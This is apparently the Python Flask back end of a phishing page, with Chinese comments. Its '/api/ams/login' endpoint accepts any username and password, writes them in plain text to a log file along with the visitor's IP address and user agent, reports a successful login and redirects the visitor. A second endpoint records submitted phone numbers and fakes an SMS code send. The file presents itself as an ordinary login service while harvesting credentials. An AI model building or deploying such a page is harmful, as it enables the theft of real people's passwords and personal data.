import datetime
import importlib.util
import logging
import os

from flask import Flask, jsonify, redirect, request
from flask_cors import CORS

# 尝试导入配置文件，如果不存在则使用默认值
try:
    import config
    API_CONFIG = config.API_CONFIG
    LOG_CONFIG = config.LOG_CONFIG
except ImportError:
    print("警告: 未找到config.py，使用默认配置")
    API_CONFIG = {
        'HOST': '0.0.0.0',
        'PORT': 8090,
        'CORS_ORIGINS': "http://localhost:8081",
        'REDIRECT_URL': "",
        'INDEX_FILE': "index.html"
    }
    LOG_CONFIG = {
        'LOG_FILE': 'login_attempts.log',
        'LOG_LEVEL': 'INFO'
    }

app = Flask(__name__, static_folder='.')
# 正确配置CORS，支持凭证
CORS(app, supports_credentials=True, resources={
     r"/api/*": {"origins": API_CONFIG['CORS_ORIGINS']}})

# 配置日志
logging.basicConfig(
    filename=LOG_CONFIG['LOG_FILE'],
    level=getattr(logging, LOG_CONFIG['LOG_LEVEL']),
    format='%(asctime)s - %(message)s'
)

# 重定向的目标URL
REDIRECT_URL = API_CONFIG['REDIRECT_URL']
INDEX_URL = API_CONFIG['INDEX_FILE']


@app.route('/')
def index():
    return app.send_static_file(INDEX_URL)


@app.route('/api/ams/login', methods=['POST'])
def login():
    # 获取提交的用户名和密码
    username = request.form.get('username', '')
    password = request.form.get('password', '')

    # 记录登录尝试
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    log_entry = {
        "timestamp": timestamp,
        "ip": client_ip,
        "username": username,
        "password": password,
        "user_agent": user_agent
    }

    # 写入日志
    logging.info(f"登录尝试: {log_entry}")

    # 返回成功响应并重定向
    return jsonify({
        "success": True,
        "message": "登录成功，正在跳转...",
        "redirect": REDIRECT_URL
    })


@app.route('/api/ams/sms/sendLoginAuthCode', methods=['POST'])
def send_sms():
    # 记录请求的手机号
    username = request.args.get('username', '')
    client_ip = request.remote_addr
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    log_entry = {
        "timestamp": timestamp,
        "ip": client_ip,
        "phone": username,
        "action": "请求验证码"
    }

    # 写入日志
    logging.info(f"验证码请求: {log_entry}")

    # 模拟成功响应
    return jsonify({
        "success": True,
        "message": "发送成功"
    })


if __name__ == '__main__':
    # 启动服务器，显示调试信息
    app.run(host=API_CONFIG['HOST'], port=API_CONFIG['PORT'], debug=True)
